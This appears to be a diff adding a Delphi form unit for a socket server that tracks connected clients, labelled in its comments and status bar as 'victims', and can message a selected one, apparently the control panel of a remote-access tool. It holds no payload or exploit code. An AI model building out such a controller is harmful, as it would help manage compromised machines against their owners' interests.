@@ -1,0 +1,115 @@
+unit Unit1;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
+  System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Menus, Vcl.ComCtrls,
+  System.Win.ScktComp;
+
+type
+  TClientData = record
+    UserName: string;
+  end;
+
+type
+  TForm1 = class(TForm)
+    ListView1: TListView;
+    StatusBar1: TStatusBar;
+    PopupMenu1: TPopupMenu;
+    B1: TMenuItem;
+    S1: TMenuItem;
+    ServerSocket1: TServerSocket;
+    procedure FormCreate(Sender: TObject);
+    procedure ServerSocket1ClientRead(Sender: TObject;
+      Socket: TCustomWinSocket);
+    procedure ServerSocket1ClientDisconnect(Sender: TObject;
+      Socket: TCustomWinSocket);
+    procedure S1Click(Sender: TObject);
+  private
+    { Private declarations }
+  public
+    VictimCount:integer;
+  end;
+
+var
+  Form1: TForm1;
+
+implementation
+
+{$R *.dfm}
+
+procedure TForm1.FormCreate(Sender: TObject);
+begin
+  self.VictimCount:=0;
+  self.ServerSocket1.Port := 3434;
+  self.ServerSocket1.Open;
+  // update gui and display the server is active... ive done this at design time no need to code anything...
+end;
+
+procedure TForm1.S1Click(Sender: TObject);
+var
+  client: TCustomWinSocket;
+  I: integer;
+  ClientData: ^TClientData;
+begin
+  for I := 0 to self.ServerSocket1.Socket.ActiveConnections - 1 do
+  begin
+    client := ServerSocket1.Socket.Connections[I];
+    ClientData := client.Data;
+    if ClientData.UserName = self.ListView1.Selected.SubItems[0] then
+    begin
+      client.SendText('MSG To ONE DUDE!');
+    end;
+  end;
+end;
+
+procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject;
+  Socket: TCustomWinSocket);
+var
+  ClientData: ^TClientData;
+  I: integer;
+begin
+  ClientData := Socket.Data;
+  Socket.Data := nil;
+  // loop listivew and find the client and remove them...
+  for I := 0 to Form1.ListView1.Items.Count - 1 do
+  begin
+    if Form1.ListView1.Items[I].SubItems[0] = ClientData.UserName then
+      Form1.ListView1.Items[I].Delete;
+    break;
+  end;
+  Dispose(ClientData);
+
+  //Decrease the victim counter...
+  self.VictimCount:= self.VictimCount - 1;
+  self.StatusBar1.Panels[1].Text:= 'Victims Online: ' + inttostr(self.VictimCount);
+end;
+
+procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
+  Socket: TCustomWinSocket);
+var
+  ClientData: ^TClientData;
+  sl: Tstringlist;
+  li:Tlistitem;
+begin
+  sl := Tstringlist.Create;
+  sl.Delimiter := '|';
+  sl.StrictDelimiter := true;
+  sl.DelimitedText := Socket.ReceiveText;
+  if sl[0] = 'NewCon' then
+  begin
+    New(ClientData);
+    ClientData.UserName := sl[1];
+    // read Client unique ID from the victim...
+    Socket.Data := ClientData;
+    li:=form1.ListView1.Items.Add;
+    li.Caption:= socket.RemoteAddress;
+    li.SubItems.Add(sl[1]);
+    self.VictimCount:= self.VictimCount + 1;
+    self.StatusBar1.Panels[1].Text:= 'Victims Online: ' + inttostr(self.VictimCount);
+  end;
+end;
+
+end.
